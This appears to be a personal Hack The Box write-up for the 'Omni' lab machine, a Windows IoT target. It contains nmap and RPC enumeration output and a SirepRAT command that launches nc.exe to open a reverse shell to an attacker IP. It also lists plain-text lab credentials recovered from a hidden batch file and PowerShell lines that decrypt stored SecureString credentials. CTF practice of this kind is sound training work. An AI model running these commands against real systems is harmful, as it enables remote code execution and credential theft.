---
tags: [HTB]
title: Omni
created: '2020-09-29T08:52:43.755Z'
modified: '2020-11-10T17:32:47.650Z'
---

# Omni

```bash
Nmap 7.80 scan initiated Mon Aug 24 10:23:59 2020 as: nmap -Pn -sS -sV -p- -A -oN nmap.txt 10.10.10.204
Nmap scan report for 10.10.10.204
Host is up (0.091s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
```
## Information
- Windows IOT Device portal on port 8080
- dealing with some sort of rasberry pi type ctf
- once on portal could upload malicious payload 


## Potential attack vectors

1. port 8080
  - Running a webserver, asks for creds when visited
  - could try windows device portal default creds
  - could try auth bypass
  - brute force


2. port 135
  - RPC
  - impacket? RPCdump?

``` bash
Impacket v0.9.22.dev1+20200624.115240.5db5e4fa - Copyright 2020 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.204
Protocol: N/A 
Provider: N/A 
UUID    : DD59071B-3215-4C59-8481-972EDADC0F6A v1.0 
Bindings: 
          ncalrpc:[umpo]

Protocol: N/A 
Provider: N/A 
UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0 
Bindings: 
          ncalrpc:[LRPC-969e8bd0adcc18d488]
          ncalrpc:[ubpmtaskhostchannel]
          ncalrpc:[DeviceSetupManager]
          ncalrpc:[IUserProfile2]
          ncalrpc:[OLE6FC7DF673575CA3599FFF1D796AB]

Protocol: N/A 
Provider: N/A 
UUID    : D22895EF-AFF4-42C5-A5B2-B14466D34AB4 v1.0 
Bindings: 
          ncalrpc:[LRPC-76118920d558631e9e]

Protocol: N/A 
Provider: N/A 
UUID    : 0361AE94-0316-4C6C-8AD8-C594375800E2 v1.0 
Bindings: 
          ncalrpc:[umpo]

Protocol: N/A 
Provider: N/A 
UUID    : 6982A06E-5FE2-46B1-B39C-A2C545BFA069 v1.0 
Bindings: 
          ncalrpc:[umpo]

Protocol: N/A 
Provider: N/A 
UUID    : 51A227AE-825B-41F2-B4A9-1AC9557A1018 v1.0 Ngc Pop Key Service
Bindings: 
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[LSA_IDPEXT_ENDPOINT]
```

3. IOT Device 
  - SirepRAT.py 
  - https://github.com/SafeBreach-Labs/SirepRAT

  ```
  python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "cmd.exe" --args "/c C:\nc.exe -e cmd.exe 10.10.14.162 5555 " --v

  ```

>hidden r.bat file in ```C:\windows\system32>cd C:\Program Files\WindowsPowerShell\Modules\PackageManagement```
>> contains username and password for device manager
  - net user app mesh5143
    net user administrator _1nt3rn37ofTh1nGz

- Able to enter commands on dashboard

https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials

#Decode Securestring
```$credential = Import-CliXml -Path C:\<path to file>```
```$plainPass = $credential.GetNetworkCredential().Password```
```$plainPass```



